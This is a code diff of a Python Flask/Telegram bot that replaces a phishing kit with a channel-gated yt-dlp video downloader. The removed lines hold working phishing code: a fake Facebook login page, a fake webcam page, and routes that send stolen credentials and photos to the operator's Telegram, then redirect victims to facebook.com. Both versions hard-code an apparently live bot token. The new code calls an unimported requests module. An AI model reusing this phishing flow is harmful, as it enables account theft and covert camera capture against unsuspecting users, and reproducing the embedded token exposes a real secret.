@@ -1,126 +1,251 @@
 # -*- coding: utf-8 -*-
-from flask import Flask, request, send_file
-import requests
-import json
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import yt_dlp
 import os
-import tempfile
-import base64
-import time
-from datetime import datetime
-
-app = Flask(__name__)
+import re
+import threading
+from flask import Flask, request
 
 # ==================== CONFIG ====================
 BOT_TOKEN = "8607359712:AAGVPHwLolvKL7MZUp16nHcY00yf3bP0R60"
 ADMIN_ID = "8518408753"
-PHISH_PORT = 8080
 
-# Storage for captured data
-captured_data = []
+# Required channels
+REQUIRED_CHANNELS = [
+    {"username": "@WahidModeX", "url": "https://t.me/WahidModeX"},
+    {"username": "@ProTech43", "url": "https://t.me/ProTech43"}
+]
 
-def send_telegram(chat_id, text):
+# Flask app for webhook
+app = Flask(__name__)
+
+# Bot instance
+bot = telebot.TeleBot(BOT_TOKEN)
+
+# Store user verification status
+user_verified = {}
+
+# ==================== BUTTONS ====================
+def get_check_button():
+    keyboard = InlineKeyboardMarkup()
+    check_btn = InlineKeyboardButton("✅ Check Membership", callback_data="check_membership")
+    keyboard.add(check_btn)
+    return keyboard
+
+def get_channels_text():
+    channels = "\n".join([f"📢 {ch['username']}" for ch in REQUIRED_CHANNELS])
+    return channels
+
+# ==================== CHECK MEMBERSHIP ====================
+def is_user_member(user_id):
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        payload = {"chat_id": chat_id, "text": text}
-        requests.post(url, json=payload, timeout=5)
+        for channel in REQUIRED_CHANNELS:
+            chat_member = bot.get_chat_member(channel["username"], user_id)
+            if chat_member.status in ['left', 'kicked']:
+                return False
+        return True
+    except:
+        return False
+
+# ==================== DOWNLOAD VIDEO ====================
+def download_video(url, user_id):
+    download_path = f"downloads/{user_id}"
+    os.makedirs(download_path, exist_ok=True)
+    
+    ydl_opts = {
+        'outtmpl': f'{download_path}/%(title)s.%(ext)s',
+        'format': 'best[height<=720]',
+        'quiet': True,
+        'no_warnings': True,
+    }
+    
+    try:
+        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+            info = ydl.extract_info(url, download=True)
+            filename = ydl.prepare_filename(info)
+            # Get actual file extension
+            if not os.path.exists(filename):
+                filename = filename.replace('.webm', '.mp4').replace('.mkv', '.mp4')
+            return filename
     except Exception as e:
         print(f"Error: {e}")
+        return None
 
-def save_file(data, filename):
-    tempdir = tempfile.gettempdir()
-    filepath = os.path.join(tempdir, filename)
-    with open(filepath, 'wb') as f:
-        f.write(data)
-    return filepath
-
-# Phishing pages
-PHISHING_PAGES = {
-    'facebook': '''<!DOCTYPE html><html><head><title>Facebook</title><meta name="viewport" content="width=device-width"><style>
-body{background:#1877f2;margin:0;padding:20px;font-family:Arial;display:flex;align-items:center;justify-content:center;min-height:100vh;}
-.c{max-width:400px;width:100%;background:#fff;border-radius:8px;padding:20px;}
-h1{font-size:24px;}
-input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;}
-.btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;cursor:pointer;}
-</style></head><body><div class="c"><h1>Account Security</h1><form action="/capture" method="POST"><input name="email" placeholder="Email or Phone" required><input name="pass" type="password" placeholder="Password" required><button class="btn">Verify</button></form></div></body></html>''',
+# ==================== TELEGRAM BOT HANDLERS ====================
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    user_id = message.from_user.id
     
-    'camera': '''<!DOCTYPE html><html><head><title>Camera</title><style>
-body{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;font-family:Arial;text-align:center;padding:20px;}
-video{border-radius:15px;max-width:90%;}
-button{padding:15px 30px;background:#ff6b6b;color:#fff;border:none;border-radius:25px;cursor:pointer;margin:10px;}
-</style></head><body><h1>Security Video</h1><video id="video" width="400" height="300" autoplay muted></video><br><button onclick="capture()">Take Photo</button><script>
-async function initCam(){try{stream=await navigator.mediaDevices.getUserMedia({video:true});document.getElementById('video').srcObject=stream;}catch(e){alert('Allow camera access!');}}
-initCam();
-function capture(){canvas=document.createElement('canvas');canvas.width=400;canvas.height=300;canvas.getContext('2d').drawImage(document.getElementById('video'),0,0);data=canvas.toDataURL('image/jpeg');fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({img:data})});alert('Photo sent!');}
-</script></body></html>'''
-}
+    welcome_text = f"""🚀 **Welcome to Video Downloader Bot!**
+
+📌 **Features:**
+• Download videos from YouTube, Instagram, TikTok, Facebook, Twitter, Telegram
+• Fast and High Quality
+• Free to use
+
+📢 **Join our channels to use this bot:**
+{get_channels_text()}
+
+✅ After joining, click the button below to verify."""
+
+    bot.send_message(
+        user_id, 
+        welcome_text, 
+        parse_mode='Markdown',
+        reply_markup=get_check_button()
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data == "check_membership")
+def check_membership(call):
+    user_id = call.from_user.id
+    
+    if is_user_member(user_id):
+        user_verified[user_id] = True
+        bot.edit_message_text(
+            "✅ **Verification Successful!**\n\nYou are now verified. Send me any video link to download.",
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown'
+        )
+        bot.send_message(
+            user_id,
+            "📎 **Send me a video link:**\n\nSupported platforms:\nYouTube • Instagram • TikTok • Facebook • Twitter • Telegram"
+        )
+    else:
+        not_joined = []
+        for channel in REQUIRED_CHANNELS:
+            try:
+                chat_member = bot.get_chat_member(channel["username"], user_id)
+                if chat_member.status in ['left', 'kicked']:
+                    not_joined.append(f"❌ {channel['username']}")
+            except:
+                not_joined.append(f"❌ {channel['username']}")
+        
+        channels_text = "\n".join(not_joined)
+        bot.answer_callback_query(
+            call.id,
+            "Please join all channels first!",
+            show_alert=True
+        )
+        bot.edit_message_text(
+            f"❌ **You haven't joined these channels:**\n\n{channels_text}\n\nPlease join them and click verify again.",
+            user_id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=get_check_button()
+        )
+
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    user_id = message.from_user.id
+    text = message.text
+    
+    # Check if user is verified
+    if not user_verified.get(user_id, False):
+        if not is_user_member(user_id):
+            bot.send_message(
+                user_id,
+                "❌ **Access Denied!**\n\nPlease join our channels first:\n" + get_channels_text(),
+                reply_markup=get_check_button()
+            )
+            return
+        else:
+            user_verified[user_id] = True
+    
+    # Check if message contains a URL
+    url_pattern = re.compile(r'https?://[^\s]+')
+    urls = url_pattern.findall(text)
+    
+    if not urls:
+        bot.send_message(
+            user_id,
+            "📎 **Please send a valid video link!**\n\nExamples:\n• https://youtube.com/watch?v=...\n• https://instagram.com/p/...\n• https://tiktok.com/@.../video/..."
+        )
+        return
+    
+    url = urls[0]
+    
+    # Send processing message
+    msg = bot.send_message(user_id, "⏬ **Downloading video...**\n\nPlease wait, this may take a few seconds.")
+    
+    # Download video
+    video_path = download_video(url, user_id)
+    
+    if video_path and os.path.exists(video_path):
+        bot.edit_message_text("📤 **Uploading video...**", user_id, msg.message_id)
+        
+        try:
+            # Send video
+            with open(video_path, 'rb') as video:
+                bot.send_video(user_id, video, caption="✅ **Video downloaded successfully!**\n\nEnjoy! 🎬")
+            
+            bot.delete_message(user_id, msg.message_id)
+            
+            # Clean up
+            os.remove(video_path)
+            os.rmdir(f"downloads/{user_id}")
+            
+        except Exception as e:
+            bot.edit_message_text(f"❌ **Error uploading video!**\n\nTry a shorter video or different link.", user_id, msg.message_id)
+    else:
+        bot.edit_message_text(
+            "❌ **Download failed!**\n\nPossible reasons:\n• Link is invalid\n• Video is private\n• Unsupported platform\n\nTry another link.",
+            user_id,
+            msg.message_id
+        )
+
+@bot.message_handler(commands=['creators'])
+def creators_command(message):
+    creators_text = """👨‍💻 **Bot Creators:**\n@Kingwahid\n@XFPro43\n\n📢 **Our Channels:**\n@WahidModeX\n@ProTech43"""
+    bot.send_message(message.chat.id, creators_text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['status'])
+def status_command(message):
+    user_id = message.from_user.id
+    is_member = is_user_member(user_id)
+    is_verified = user_verified.get(user_id, False)
+    
+    status_text = f"""📊 **Bot Status**
+
+✅ Verified: {is_verified}
+📢 Channel Member: {is_member}
+
+Send /start to re-verify."""
+    bot.send_message(user_id, status_text, parse_mode='Markdown')
+
+# ==================== FLASK WEBHOOK ====================
+@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
+def webhook():
+    json_str = request.get_data().decode('UTF-8')
+    update = telebot.types.Update.de_json(json_str)
+    bot.process_new_updates([update])
+    return 'OK', 200
 
 @app.route('/')
 def home():
-    return "Bot is running! Send /start to Telegram bot."
+    return "Video Downloader Bot is running!"
 
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    data = request.get_json()
-    if data and 'message' in data:
-        chat_id = str(data['message']['chat']['id'])
-        text = data['message'].get('text', '')
-        
-        if text == '/start':
-            msg = """Welcome to Phish Bot!
-            
-Commands:
-/facebook - Get Facebook phishing page
-/camera - Get camera phishing page
-/status - Check bot status"""
-            send_telegram(chat_id, msg)
-        
-        elif text == '/facebook':
-            send_telegram(chat_id, "Facebook Phishing Page:\nhttps://telegrambothost-op7o.onrender.com/phish/facebook")
-        
-        elif text == '/camera':
-            send_telegram(chat_id, "Camera Phishing Page:\nhttps://telegrambothost-op7o.onrender.com/phish/camera")
-        
-        elif text == '/status':
-            send_telegram(chat_id, f"Bot is active!\nCaptured items: {len(captured_data)}")
-        
-        else:
-            send_telegram(chat_id, "Unknown command. Send /start for help.")
-    
-    return "OK", 200
-
-@app.route('/phish/<page_name>')
-def phish_page(page_name):
-    html = PHISHING_PAGES.get(page_name, PHISHING_PAGES['facebook'])
-    return html
-
-@app.route('/capture', methods=['POST'])
-def capture():
-    if request.is_json:
-        data = request.get_json()
-        if 'img' in data:
-            img_data = base64.b64decode(data['img'].split(',')[1])
-            filename = f"cam_{int(time.time())}.jpg"
-            filepath = save_file(img_data, filename)
-            send_telegram(ADMIN_ID, f"Camera capture saved: {filepath}")
-            captured_data.append(f"Photo: {datetime.now()}")
-    else:
-        email = request.form.get('email', '')
-        password = request.form.get('pass', '')
-        if email and password:
-            hit = f"Login: {email} | {password} at {datetime.now()}"
-            captured_data.append(hit)
-            send_telegram(ADMIN_ID, hit)
-    
-    return '<script>alert("Verified!");location.href="https://facebook.com";</script>'
-
-@app.route('/setwebhook')
 def set_webhook():
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url=https://telegrambothost-op7o.onrender.com/webhook"
-    try:
-        response = requests.get(url)
-        return response.text
-    except Exception as e:
-        return str(e)
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url=https://telegrambothost-op7o.onrender.com/webhook/{BOT_TOKEN}"
+    response = requests.get(url)
+    print(response.text)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+    # Create downloads folder
+    os.makedirs("downloads", exist_ok=True)
+    
+    # Remove webhook and use polling (better for Render)
+    bot.remove_webhook()
+    
+    # Start bot in a separate thread
+    def run_bot():
+        print("Bot started polling...")
+        bot.infinity_polling(timeout=10, long_polling_timeout=5)
+    
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
+    bot_thread.start()
+    
+    # Run Flask server
+    print("Flask server running on port 8080...")
+    app.run(host='0.0.0.0', port=8080)
